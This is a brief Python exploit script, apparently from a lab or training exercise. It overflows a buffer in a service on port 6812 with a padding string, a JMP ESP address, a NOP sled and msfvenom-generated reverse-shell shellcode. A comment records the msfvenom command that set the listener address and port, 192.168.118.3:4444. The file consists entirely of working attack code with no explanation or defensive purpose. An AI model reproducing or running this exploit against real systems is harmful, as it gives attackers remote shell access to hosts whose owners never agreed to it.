import socket
import sys
import struct

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.118.3 LPORT=4444 -b "\x00" -f py EXITFUNC=thread
# Payload size: 95 bytes

buf =  b""
buf += b"\xdb\xd4\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x12\xbf\x12"
buf += b"\xa3\xb0\x5a\x31\x7e\x17\x03\x7e\x17\x83\xfc\x5f\x52"
buf += b"\xaf\x31\x7b\x64\xb3\x62\x38\xd8\x5e\x86\x37\x3f\x2e"
buf += b"\xe0\x8a\x40\xdc\xb5\xa4\x7e\x2e\xc5\x8c\xf9\x49\xad"
buf += b"\xce\x52\x98\x59\xa7\xa0\xdb\xb0\x6b\x2c\x3a\x02\xf5"
buf += b"\x7e\xec\x31\x49\x7d\x87\x54\x60\x02\xc5\xfe\x15\x2c"
buf += b"\x99\x96\x81\x1d\x72\x04\x3b\xeb\x6f\x9a\xe8\x62\x8e"
buf += b"\xaa\x04\xb8\xd1"

host = sys.argv[1]
jmpesp = struct.pack("<I", 0x52501515)

buffer = "A" * 524 + jmpesp + "\x90" * 20 + buf + "\xff" * 200

z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

z.connect((host, 6812))

print "[*] Sending Payload!"

z.send("%s\r\n" %buffer)

z.close()
